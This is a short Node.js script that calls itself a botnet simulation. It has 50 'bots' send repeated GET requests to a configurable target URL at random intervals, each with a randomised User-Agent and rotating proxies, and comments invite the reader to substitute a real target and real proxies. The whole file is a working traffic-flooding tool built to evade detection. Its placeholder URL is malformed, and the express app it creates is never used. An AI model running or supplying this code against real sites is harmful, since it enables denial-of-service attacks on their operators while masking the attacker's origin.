const express = require("express");
const axios = require("axios");
const randomUseragent = require("random-useragent");
const ProxyAgent = require("proxy-agent");

const app = express();

app.use(express.json());

// Function to simulate a bot making an HTTP request
async function botRequest(targetUrl, proxy) {
   try {
      const userAgent = randomUseragent.getRandom(); // Generate a random User-Agent
      const config = {
         headers: {
            "User-Agent": userAgent,
         },
      };

      if (proxy) {
         config.httpAgent = new ProxyAgent(proxy); // Use proxy if provided
      }

      // Make the GET request to the target URL
      const response = await axios.get(targetUrl, config);
      console.log(`Request successful from ${userAgent}: ${response.status}`);
   } catch (error) {
      console.log(`Error in bot request: ${error.message}`);
   }
}

// Function to simulate multiple bots sending requests
function simulateBotnet(targetUrl, numberOfBots, proxyList) {
   for (let i = 0; i < numberOfBots; i++) {
      const proxy =
         proxyList.length > 0 ? proxyList[i % proxyList.length] : null;

      setInterval(() => {
         botRequest(targetUrl, proxy); // Each bot sends requests at random intervals
      }, Math.random() * 5000); // Random interval between 0 and 5 seconds
   }
}

// Main program configuration
const targetUrl = "http://localhost:4333.com"; // Replace with your target URL
const numberOfBots = 50; // Number of bots to simulate
const proxyList = ["http://proxy1.com", "http://proxy2.com"]; // Example proxy list (replace with real proxies)


// Start the botnet simulation
simulateBotnet(targetUrl, numberOfBots, proxyList);
